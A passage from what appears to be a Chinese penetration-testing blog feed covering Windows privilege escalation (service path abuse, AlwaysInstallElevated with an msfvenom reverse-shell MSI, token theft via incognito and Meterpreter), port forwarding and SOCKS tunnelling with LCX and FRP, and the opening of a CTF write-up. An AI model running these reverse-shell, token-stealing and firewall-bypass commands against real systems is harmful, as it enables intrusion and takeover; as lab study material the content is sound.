shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula /quv &quot;C:\Program Files\Insecure Executables\&quot; <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327221559789.png" alt="image-20240327221559789"></p></li><li><p>结果中看到”INTERACTIVE”组对该文件夹具有完全控制权限、</p><p>该组包含所有能够登录到系统的成员。此时，测试人员可以将InsexeSvc 服务的二进制文件替换成一个同名的攻击载荷，并随着服务的重启继承系统权限</p></li></ol><h2 id="未引用的服务路径"><a href="#未引用的服务路径" class="headerlink" title="未引用的服务路径"></a>未引用的服务路径</h2><p>未引用的服务路径(Unquoted Service Path)漏洞曾被称为可信任的服务路径(TrustedService Path)，利用了 Windows 文件路径解析的特性。当服务启动所执行的二进制文件的路径中包含空格且未有效包含在引号中时，就会导致该漏洞。</p><p>造成该漏洞的根本原因在于 Windows 系统中用于创建进程的 CreateProcess 函数。</p><p>如果完整路径中包含空格且未有效包含在引号中，那么对于该路径中的每个空格Windows 会按照从左到右的顺序依次尝试寻找并执行与空格前的名字相匹配的程序。例如,对于路径 C:\Program Files\Sub Dir\Program Name.exe,系统依次寻找并执行以下程序C:\Program.exe，C:Program Files\Sub.exe ，C:\Program Files\Sub Dir\Program.exe，C:\Program Files\Sub Dir\Program Name.exe 。</p><blockquote><p>当系统进行该路径尝试的时候，会以当前服务所拥有的权限进行。所以当对受影响的目录具有写入权限时，可以上传一个特殊命名的攻击载荷到该目录中</p></blockquote><ol><li><p>执行下面命令枚举主机上所有有该漏洞的服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327223437698.png" alt="image-20240327223437698"></p><p>可知UnquoteSvc这个服务的路径有空格且没有引号包裹</p></li><li><p>用Accesschk检查该受影响的目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula  -quv &quot;Authenticated Users&quot; &quot;C:\Program Files\Unquoted Path\&quot; <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327224123522.png" alt="image-20240327224123522"></p><p>这个时候就可以向该目录上传一个Sub.exe的攻击载荷，检查到这里的时候就会以SYSTEM权限执行Sub.exe程序。</p></li></ol><h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>powerup就是一个powershell脚本，里面集中了上面所说的所有方法。使用方法可以去看官方文档</p><p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p><p>这里有一篇使用的文章：<a href="https://blog.51cto.com/binghe001/5247921">https://blog.51cto.com/binghe001/5247921</a></p><h1 id="MSI安装策略提权"><a href="#MSI安装策略提权" class="headerlink" title="MSI安装策略提权"></a>MSI安装策略提权</h1><p>MSI安装策略提权是由于用户在配置MSI安装策略时，启用了**“永远以高特权进行安装”(AlwaysInstallElevated，默认情况下为禁用状态)**，使得任何权限的用户都可以通过 SYSTEM 权限安装MSI程序。此时测试人员可以在目标主机上安装一个预先制作的恶意MSI文件，以获得SYSTEM 权限。</p><blockquote><p>MSI（Microsoft Installer）是一种用于 Windows 操作系统的安装包格式，MSI 安装策略指的是针对 MSI 安装程序的一系列安装和配置规则。以下是一些常见的 MSI 安装策略：</p><ol><li><strong>组策略（Group Policy）</strong>：管理员可以使用组策略来指定计算机或用户级别的 MSI 安装策略，例如允许或禁止特定程序的安装、配置安装包位置等。</li><li><strong>静默安装（Silent Installation）</strong>：通过在命令行中使用特定参数，可以实现无需用户干预的 MSI 静默安装。这种安装方式通常用于批量部署软件。</li><li><strong>卸载策略</strong>：管理员可以指定卸载 MSI 软件的策略，包括是否允许用户卸载软件、是否强制卸载等。</li><li><strong>修补策略（Patch Policy）</strong>：允许管理员为已安装的 MSI 软件应用修补程序，以解决漏洞或增加功能。管理员可以规定哪些修补程序允许应用、如何应用修补程序等。</li><li><strong>升级策略（Upgrade Policy）</strong>：管理员可以定义升级策略来升级已安装的软件版本，以确保网络上的计算机都在运行最新版本。</li><li><strong>限制策略（Restriction Policy）</strong>：可以通过策略限制哪些用户或计算机可以安装某个 MSI 软件，从而控制软件的分发和访问权限。</li></ol><p>MSI实际上是一个数据库，包含安装和卸载软件时需要使用的大量指令和程序数据</p></blockquote><h2 id="确定系统是否存在漏洞"><a href="#确定系统是否存在漏洞" class="headerlink" title="确定系统是否存在漏洞"></a>确定系统是否存在漏洞</h2><p>如果用户配置了”永远以高特权进行安装”，会在注册表下面两个位置创建键值1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br>HKET_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>可以执行下面的命令进行确认是否开启该特权</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231001600.png" alt="image-20240327231001600"></p><h2 id="创建恶意MSI并安装"><a href="#创建恶意MSI并安装" class="headerlink" title="创建恶意MSI并安装"></a>创建恶意MSI并安装</h2><p>确定目标系统存在该漏洞后，使用MetaSploit自动生成MSI</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.147 LPORT=4444 -f msi -o reverse_tcp.msi<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231406326.png" alt="image-20240327231406326"></p><p>在现有的 Meterpreter 会话中将创建的MSI文件上传到目标计算机，执行以下命令:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msiexec /quiet /qn /i reverse_tcp.msi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/quiet，在安装期间禁止向用户发送任何消息；/qn，无GUI模式允许；/i，常规安装</span><br></code></pre></td></tr></table></figure><p>最终提权如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231615328.png" alt="image-20240327231615328"></p><h1 id="访问令牌操纵"><a href="#访问令牌操纵" class="headerlink" title="访问令牌操纵"></a>访问令牌操纵</h1><p>Windows 操作系统的访问控制模型(Access Control Model)是 Windows 系统安全性的基础构件，由访问令牌(Access Token)和安全描述符(Security Descriptor)两部分组成，二者分别被访问者和被访问者所持有。通过比较访问令牌和安全描述符的内容Windows 可以对访问者是否拥有访问资源对象的能力进行判定。</p><h2 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h2><p>当用户登录时，如果验证通过就会为用户创建一个访问令牌，包括登录过程返回的SID以及由本地安全策略分配给用户和用户所属安全组的特权列表。代表该用户执行的每个进程都有此访问令牌的副本。</p><p>Windows 中的令牌可以分为主令牌(Primary Token)和模拟令牌(Impersonation Token)。主令牌与进程相关联，是由 Windows内核创建并分配给进程的默认访问令牌。主令牌与进程相关联，是由Windows内核创建并分配给进程的默认访问令牌。<strong>每个进程都有一个主令牌</strong>，描述了与当前进程关联的用户账户的安全上下文。</p><p>当进程与安全对象进行交互的时候，系统将使用主令牌；此外，线程可以模拟客户端账户，模拟是指线程在安全上下文中执行的能力，并且该上下文不同于拥有该线程的进程的上下文。<strong>当线程模拟客户端时，模拟线程将同时具有主访问令牌和模拟令牌。</strong></p><blockquote><p>通过操纵访问令牌，使当前的进程看起来像是其他进程所启动的子进程或者其他用户所启动的进程；使用内置的Windows API从指定的进程中复制访问令牌来用于现有进程或者生成新进程，并以此来绕过访问控制，提升权限，<strong>这个过程叫做令牌窃取。</strong></p></blockquote><p>内置API：</p><table><thead><tr><th>Win32 API</th><th>说明</th></tr></thead><tbody><tr><td>OpenProcess</td><td>根据提供的进程ID获取指定进程的句柄</td></tr><tr><td>OpenProcessToken</td><td>获取与指定进程相关联的访问令牌的句柄</td></tr><tr><td>DuplicateTokenEx</td><td>复制现有的访问令牌以创建一个新的访问令牌，包括创建主令牌或模拟令牌</td></tr><tr><td>ImpersonateLoggedOnUser</td><td>调用线程来模拟登录用户的访问令牌的安全上下文</td></tr><tr><td>CreateProcessWithTokenW</td><td>创建一个新进程及其主线程，新进程在指定令牌的安全上下文中运行</td></tr><tr><td>CreateProcessAsUserA</td><td>创建一个新进程及其主线程，新进程在由指定令牌表示的用户的安全上下文中运行</td></tr></tbody></table><p>这是一个使用api复制令牌的程序示例：</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD pid = <span class="hljs-number">1234</span>; <span class="hljs-comment">// 替换为目标进程的进程ID</span><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法打开目标进程，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hToken;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &amp;hToken)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法获取目标进程的访问令牌，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hTokenDuplicate;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DuplicateTokenEx</span>(hToken, MAXIMUM_ALLOWED, <span class="hljs-literal">NULL</span>, SecurityImpersonation, TokenImpersonation, &amp;hTokenDuplicate)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法复制访问令牌，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;成功复制访问令牌！&quot;</span> &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 这里可以使用复制的令牌进行操作</span><br><br>    <span class="hljs-built_in">CloseHandle</span>(hToken);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(hTokenDuplicate);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意，令牌窃取只能在特权用户上下文中才能完成，因为通过令牌创建进程使用的CreateProcessWithTokenW和 CreateProcessAsUserA 两个 WindowsAPI分别要求用户必须拥有SeImpersonatePrivilege和 SeAssignPrimaryTokenPrivilege&#x2F;SeIncreaseQuotaPrivilege 特权，而拥有这两个特权的用户一般为系统管理员账户、网络服务账户和系统服务账户(如IIS、MSSQL 等)。</p></blockquote><h2 id="常规令牌窃取操作"><a href="#常规令牌窃取操作" class="headerlink" title="常规令牌窃取操作"></a>常规令牌窃取操作</h2><p>常规的令牌窃取操作往往用来将从管理员权限提升至SYSTEM、TrustedInstaller 等更高的系统权限。在实战中，如果本地管理员账户因为某些组策略设置无法获取某些特权，可以通过令牌窃取来假冒 NT AUTHORITY\SYSTEM 的令牌，以获取更高的系统权限。此外，令牌窃取还经常被用于降权或用户切换等操作。</p><p><strong>利用incognito.exe窃取令牌</strong></p><p>工具地址：<a href="https://github.com/milkdevil/incognito2/blob/master/incognito.exe">https://github.com/milkdevil/incognito2/blob/master/incognito.exe</a></p><p>下面命令列举当前主机上的所有令牌：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe list_tokens -u<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328230830862.png" alt="image-20240328230830862"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-c 参数后为要窃取的令牌；<span class="hljs-built_in">whoami</span>为窃取令牌后要执行的命令</span><br></code></pre></td></tr></table></figure><p>该命令窃取目标账户的访问令牌并创建进程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328231014201.png" alt="image-20240328231014201"></p><p>执行下面命令可以直接实现用户的切换。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328231224386.png" alt="image-20240328231224386"></p><p><strong>利用MetaSploit窃取令牌</strong></p><p>如果获取了Meterpreter，就可以进行令牌窃取等系列操作</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">load incognito  # 加载incognito模块<br>list_tokens -u    #列出主机上的所有访问令牌<br>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #窃取NT AUTHORITY\SYSTEM账户的令牌<br>steal_token &lt;PID&gt;     #从指定的进程中窃取令牌<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329103055609.png" alt="image-20240329103055609"></p><p><strong>利用令牌获取TrustedInstaller权限</strong></p><p>SYSTEM权限为Windows系统中的最高权限，但是即便获取了该权限也不能修改Windows的系统文件。</p><p>例如，C:\Windows\servicing目录即使拥有 SYSTEM权限也无法向该目录写入文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329141219861.png" alt="image-20240329141219861"></p><p>我们可以用icacls查看一下该目录的权限：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">icacls &quot;C:\Windows\servicing&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329141552795.png" alt="image-20240329141552795"></p><p>发现 NT SERVICE\TrustedInstaller 账户对其具有完全控制权限</p><blockquote><p>从 Windows Vista 开始系统内置了一个 TrustedInstaller 安全主体，拥有修改系统文件权限，专用于对系统进行维护、更新等操作。TrustedInstaller 以一个账户组的形式出现即 NT SERVICE\TrustedInstaller。</p></blockquote><p>TrustedInstaller本身也是一个服务，启动该服务是会运行TrustedInstaller.exe程序，该程序的路径为“C:\Windows\servicing\TrustedInstaller.exe”</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329143249885.png" alt="image-20240329143249885"></p><p>其拥有者就是NT SERVICE\TrustedInstaller；所以我们可以窃取该进程的令牌来获得修改系统文件的权限。</p><p>然后我们执行下面命令先启动该服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc start TrustedInstaller<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329143614256.png" alt="image-20240329143614256"></p><p>然后在meterpreter中利用上面的pid窃取令牌</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">steal_token &lt;PID&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329143700500.png" alt="image-20240329143700500"></p><h1 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h1><p>Potato家族是一种常用的提权技术，通过操纵访问令牌将已获取的Windows服务账户权限提升至系统SYSTEM权限。</p><p>Potato 家族是通过滥用前面令牌窃取提到的两个前提特权，将已获取的 NT AUTHORITY\SYSTEM 账户的访问令牌传入CreateProcessWithTokenW或CreateProcessAsUserA函数进行调用，从而在NT AUTHORITY\SYSTEM 账户的上下文创建新进程，以提升至SYSTEM权限。</p><blockquote><p>在实战场景中，若成功拿到了IIS等服务的 WebShell 或者通过 MSSQL 服务的xp_cmdshell 成功执行了系统命令，此时获取的服务账户拥有 SeImpersonatePrivilege 和SeAssignPrimaryTokenPrivilege 特权，就可以通过 Potato 家族提升至 SYSTEM 权限。</p></blockquote><h2 id="Rotten-Potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a>Rotten Potato</h2>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-端口转发和代理</title>
      <link href="/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/"/>
      <url>/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h1><p>在渗透测试中，在获取目标外网权限后，需要通过转发端口或搭建代理等方式建立内网通道。</p><h2 id="正向连接与反向连接"><a href="#正向连接与反向连接" class="headerlink" title="正向连接与反向连接"></a>正向连接与反向连接</h2><p>两个基本概念：<strong>正向连接和反向连接</strong>。例如，Metasploit 大致可以分为两种Meterpreter，一种是以 windows&#x2F;meterpreter&#x2F;bind_tcp为代表的 Bind Shell,另一种是以 windows&#x2F;meterpreter&#x2F;reverse_tcp 为代表的 Reverse Shell。其中，Bind Shell用于正向连接，而ReverseShell用于反向连接。</p><ul><li><p>正向连接：正向连接就是受控端主机监听一个端口，由控制端主机主动去连接受控端主机的过程，适用于受控主机具有公网IP的情况下。例如下图中，Attacker 和 Victim 主机都具有公网 IP，Attacker 可以直接通过IP地址访问到 Victim，所以能够使用正向连接来控制 Victim。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325091556352.png" alt="image-20240325091556352"></p></li><li><p>反向连接：反向连接是控制端主机监听一个端口，由受控端主机反向去连接控制端主机的过程适用于受控端主机没有公网 IP 的情况。如图所示，Victim 是一台位于内网并且没有公网 IP 的主机，Attacker 无法直接通过IP地址访问到 Victim。所以此时需要在Attacker 上监听一个端口，让 Victim 去反向连接 Attacker，从而实现对 Victim 的控制。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325092227731.png" alt="image-20240325092227731"></p></li></ul><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>端口转发(Port Forwarding)是网络地址转换(NAT)的一种应用。通过端口转发，一个网络端口上收到的数据可以被转发给另一个网络端口。转发的端口可以是本机的端口，也可以是其他主机上的端口。</p><p>在现实环境中，内网部署的各种防火墙和入侵检测设备会检查敏感端口上的连接情况，如果发现连接存在异样，就会立即阻断通信。通过端口转发，设置将这个被检测的敏感端口的数据转发到防火墙允许的端口上，建立起一个通信隧道，可以绕过防火墙的检 测并与指定端口进行通信。</p><p>端口映射(Port Mapping)也是网络地址转换(NAT)的一种应用，用于把公网的地址翻译成私有地址。端口映射可以将外网主机收到的请求映射到内网主机上，使得没有公网IP地址的内网主机能够对外提供相应的服务。</p><h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h2><p>SOCKS 全称为 Protocol For Sessions Traversal Across Firewall Securely，是一种代理协议，其标准端口为1080。SOCKS代理有SOCKS4和SOCKS5两个版本，SOCKS4只支持 TCP，而 SOCKS5 在SOCKS4的基础上进一步扩展，可以支持 UDP 和各种身份验证机制等协议。采用 SOCKS协议的代理服务器被称为SOCKS服务器，这是一种通用的代理服务器，在网络通信中扮演着一个请求代理人的角色。在内网渗透中，通过搭建SOCKS代理，可以与目标内网主机进行通信，避免多次使用端口转发。</p><h1 id="常见转发与代理工具"><a href="#常见转发与代理工具" class="headerlink" title="常见转发与代理工具"></a>常见转发与代理工具</h1><h2 id="LCK"><a href="#LCK" class="headerlink" title="LCK"></a>LCK</h2><p>LCX是一款十分经典的内网端口转发工具，基于Socket套接字，具有端口转发和端口映射的功能。但是目前很多杀毒软件已经将LCX加入了特征库，在实际利用时需要自行做免杀处理。</p><p>这里网上找到了一个免杀处理过的：<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><ol><li><p>目标有公网IP</p><p>如图，假设win_server2012是一台具有公网IP地址的Web服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325100613263.png" alt="image-20240325100613263"></p><p>假设此时已经获取了 WindowsServer 2012的控制权,需要登录其远程桌面查看情况,但是防火墙对 3389端口做了限制，不允许外网机器对 3389端口进行连接。那么，通过端口转发，可以将3389端口转发到其他防火墙允许的端口上，如4444端口，执行下面命令即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lck.exe -tran 4444 127.0.0.1:3389<br></code></pre></td></tr></table></figure><p>然后通过连接 Windows Server 2012的4444端口，即可成功访问其远程桌面</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">rdesktop 192.168.2.13:4444<br></code></pre></td></tr></table></figure></li><li><p>端口映射</p><p>测试环境如图所示。右侧的 Web 服务器(Windows Server 2012)有两个网卡分别连通外网和内网,分别为公网 IP(模拟)地址 192.168.2.13 和内网 IP 地址 10.10.10.13。内网还存在一台 MySQL 服务器。左侧的KaliLinux为测试人员的主机。</p><p>假设已经获取 Windows Server 2012的控制权，经过信息收集，获得内网中 MySQL服务器的 SSH 登录凭据，接下来需要登录这台服务器。但是服务器位于内网，无法直接通过 IP 地址进行访问，所以需要通过端口映射，将 MySOL 服务器的 22 端口映射到Windows Server 2012</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325103859627.png" alt="image-20240325103859627"></p><p>在win_server2012执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lcx.exe -tran 2222 10.10.10.15 22<br></code></pre></td></tr></table></figure><p>然后连接win_server2012的2222端口，即可访问MySQL服务器</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh root@192.168.2.13 -p 2222<br></code></pre></td></tr></table></figure></li><li><p>目标无公网IP</p><p>测试环境如图所示。右侧的 Web服务器(Windows Server 2012)没有公网 IP地址，通过 NAT 对外提供 Web 服务，左侧的 Ubuntu 20.04为测试人员的公网 VPS。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325105824042.png" alt="image-20240325105824042"></p></li></ol><p>先在vps上执行下面命令监听本地4444端口，并将8888端口上接收到的数据转发给本机的4444端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./lck -listen 4444 8888<br></code></pre></td></tr></table></figure><p>然后在 Windows Seryer 2012上执行以下命令,控制 Windows Server 2012 去连接 VPS的8888端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lcx.exe -slave 192.168.2.x8888 127.0.0.1 3389<br></code></pre></td></tr></table></figure><p>然后连接vps的4444端口即可访问远程桌面</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">rdesktop 192.168.2.x:4444<br></code></pre></td></tr></table></figure><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>FRP 是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS 等协议，可以将内网服务以安全、便捷的方式，通过具有公网 IP 节点的中转暴露到公网。在进行内网渗透中，FRP 是一款常用的隧道工具除此之外，FRP支持搭建SOCKS5代理应用。项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><blockquote><p> 最新的frp似乎不再采用frpc.ini和frps.ini配置文件了，而是.toml后缀的文件。</p><p>具体使用去看官方的说明。我这里还是用回旧的方便学习</p></blockquote><p><strong>现在利用FRP搭建一个SOCKS5代理</strong></p><p>书中的测试环境如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325164452772.png" alt="image-20240325164452772"></p><p>左边两台是攻击者的主机，我只能复现他的一级代理了，没那么多的服务器。</p><p>假设已经获取 Windows Server 2012的控制权，经过信息收集，获取了 FTP 服务器的SSH 登录凭据，需要继续渗透并登录FTP服务器的SSH。在Windows Server 2012 上使用 FRP 搭建 SOCKS5 代理服务，通过 SOCKS5 代理连接到 FTP 服务器。</p><ol><li><p>使用vps作为FRP的服务端，执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./frps -c ./frps.ini<br></code></pre></td></tr></table></figure><p>配置文件如下：</p></li><li><p>然后使用一台内网的机器作为客户端，我这里直接用本机了，然后把ftp起在wsl里面，图个方便</p><p>然后执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">.\frpc.exe -c .\frpc.ini<br></code></pre></td></tr></table></figure><p>配置文件如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325175909091.png" alt="image-20240325175909091"></p><blockquote><p>server_addr指向FRP服务端绑定的IP地址</p><p>server_port指向FRP服务端绑定的端口</p><p>remote_port为代理所使用的端口，会被转发到服务端</p><p>plugin为代理的类型</p></blockquote></li></ol><p>此时便成功在 Windows Server 2012与 VPS 之间搭建了一个 SOCKS5 代理服务。然后，借助第三方工具，可以让计算机的其他应用使用这个 SOCKS5 代理,如ProxyChains、Proxifier 等。这里以 ProxyChains 为例进行演示(ProxyChains 是一款可以在 Linux 下实现全局代理的软件，可以使任何应用程序通过代理上网，允许TCP和 DNS 流量通过代理隧道，支持HTTP、SOCKS4、SOCK5类型代理)。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nssctf刷题-网鼎杯</title>
      <link href="/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2020青龙组-Notes"><a href="#网鼎杯-2020青龙组-Notes" class="headerlink" title="[网鼎杯 2020青龙组]Notes"></a>[网鼎杯 2020青龙组]Notes</h1><p>这里没给题目源码只能网上找，app.js源码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    